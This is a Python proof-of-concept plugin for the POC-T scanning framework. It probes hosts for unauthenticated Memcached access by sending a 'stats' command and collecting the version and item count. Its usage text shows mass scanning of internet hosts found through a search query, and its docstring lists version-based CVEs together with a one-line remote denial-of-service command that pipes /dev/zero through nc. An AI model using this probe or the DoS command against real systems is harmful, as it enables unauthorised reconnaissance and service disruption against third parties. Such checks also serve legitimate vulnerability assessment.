#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
Memcached未授权访问

Usage
  python POC-T.py -s memcached-unauth -aS "port:11211"

Results like:
  197.xxx.0.xxx:11211 | version:1.4.13 | total_items:161028
  197.xxx.75.xxx:11211 | version:1.4.4 | total_items:51005

Possible Vulns:
 version < 1.4.17 => SASL验证绕过
 version < 1.4.3  => 远程DoS CVE-2010-1152  exp: cat /dev/zero | nc -q1 127.0.0.1 11211
 version < 1.1.12/1.2.2  => 远程溢出 CVE-2009-2415
 versoin < 1.2.8  => stats maps信息泄露 CVE-2009-1255

"""

import socket
import re
from colorama import Fore

Exist = None
res = {
    "Exist": Exist,
    "Problility":  "",
    'Summary': "",
    "Details": ""
}

def poc(ip):
    
    print("Checking" + Fore.GREEN + "[+]: " + Fore.RESET, ip)
    port = 11211
    payload = '\x73\x74\x61\x74\x73\x0a'  # command:stats
    s = socket.socket()
    socket.setdefaulttimeout(10)
    try:
        host = ip
        s.connect((host, port))
        s.send(payload)
        recvdata = s.recv(2048)  # response larger than 1024
        s.close()
        if recvdata and 'STAT version' in recvdata:
            ans_str = ip
            ans_str += ' | version:' + ''.join(re.findall(r'version\s(.*?)\s', recvdata))
            ans_str += ' | total_items:' + ''.join(re.findall(r'total_items\s(\d+)\s', recvdata))

            res['Exist'] = True
            res['Details'] = ans_str
            
            return res

    except Exception as e:
        pass

    res['Exist'] = False

    return res
